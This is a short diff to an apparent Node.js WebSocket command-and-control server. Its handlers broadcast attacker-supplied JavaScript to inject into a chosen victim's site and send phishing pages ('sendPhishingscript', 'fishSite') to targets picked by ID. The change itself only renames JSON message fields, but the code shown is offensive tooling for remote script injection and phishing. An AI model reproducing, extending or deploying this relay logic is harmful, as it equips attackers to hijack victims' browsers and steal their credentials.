@@ -201,14 +201,14 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
             var targetID= data.targetID;
             var url=data.domain;
             var script=data.script;
-            var json = {id:targetID,type:"javascript",domain:url,script:script};
+            var json = {id:targetID,type:"js",site:url,jsString:script};
             wss.broadcast(JSON.stringify(json));
         }
 
         else if (type=='sendPhishingscript'){
             var targetID= data.targetID;
             var url=data.domain;
-            var json = {id:targetID,type:"html",domain:url};
+            var json = {id:targetID,type:"html",fishSite:url};
             wss.broadcast(JSON.stringify(json));
         }
 
